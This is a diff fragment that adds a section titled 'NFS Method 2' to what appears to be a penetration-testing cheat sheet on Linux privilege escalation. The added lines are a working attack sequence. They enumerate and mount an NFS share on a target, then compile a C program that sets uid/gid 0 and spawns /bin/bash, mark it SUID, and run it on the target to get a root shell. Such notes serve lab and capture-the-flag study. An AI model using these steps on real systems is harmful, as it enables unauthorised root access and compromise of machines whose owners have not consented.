@@ -637,6 +637,20 @@ chmod +xs /tmp/nfs/shell.elf
 ````
 /tmp/shell.elf
 ````
+#### NFS Method 2
+````
+cat /etc/exports
+Attack Box:
+showmount -e 10.10.10.10
+mkdir /tmp/nfs
+mount -o rw,vers=2 10.10.10.10:/tmp /tmp/nfs
+echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/nfs/x.c
+gcc /tmp/nfs/x.c -o /tmp/nfs/x
+chmod +s /tmp/nfs/x
+Target Box:
+/tmp/x
+id
+````
 #### NFS Errors
 - When we try to mount with the alternative command above, we fail to get any response and connection times out.
 - To double check use the command:
